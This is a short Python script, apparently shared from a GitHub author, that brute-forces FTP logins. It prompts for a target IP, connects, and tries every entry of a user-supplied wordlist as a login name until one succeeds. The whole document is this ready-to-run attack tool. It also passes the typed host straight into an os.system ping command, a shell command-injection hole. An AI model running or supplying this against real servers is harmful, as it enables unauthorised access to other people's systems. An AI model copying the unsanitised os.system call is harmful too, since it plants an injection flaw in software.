#AUTHOR : MCHEVRO
#GITHUB : https://github.com/mchevro
import ftplib
import os
import time

try:
    try:
        host = input("IP Server Target : ")
        os.system(f"ping {host}")

        ftp = ftplib.FTP(f"{host}")
    except:
        print("\n\nGagal Terhubung Ke Server")
        time.sleep(10)
        exit()
    while True:
        try:
            input_file = input("\n\nKetik Nama File Wordlist : ")
            read_file  = open(input_file, 'r').readlines()
            break
        except:
            print('File Tidak Ada!')
            continue

    username_list = []
    for x in read_file:
        username_list.append(x.strip())

    for username in username_list:
        try:
            time.sleep(1)
            ftp.login(f"{username}")
            print("Login Berhasil | Username : ", username)
            time.sleep(20)
            break
        except:
            print('Username Atau Password Salah')
except KeyboardInterrupt:
    exit()